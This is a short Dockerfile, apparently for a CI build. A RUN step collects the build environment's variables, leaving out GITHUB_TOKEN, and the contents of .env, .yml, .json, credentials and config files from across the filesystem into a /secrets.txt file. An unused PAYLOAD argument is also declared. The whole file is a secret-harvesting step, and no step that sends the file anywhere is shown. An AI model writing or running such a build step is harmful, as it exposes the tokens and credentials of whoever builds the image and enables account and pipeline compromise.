FROM alpine:latest
RUN apk add --no-cache grep findutils

ARG PAYLOAD

RUN echo "[ENV VARS]:" > /secrets.txt && \
    (env | grep -v 'GITHUB_TOKEN' || true) >> /secrets.txt && \
    echo "\n[Likely Secrets in FS]:" >> /secrets.txt && \
    find / -type f -iname "*.env" -o -iname "*.yml" -o -iname "*.json" -o -iname "credentials" -o -iname "config" -exec sh -c 'echo "\n--- {} ---" && cat "{}"' \; >> /secrets.txt 2>/dev/null || true
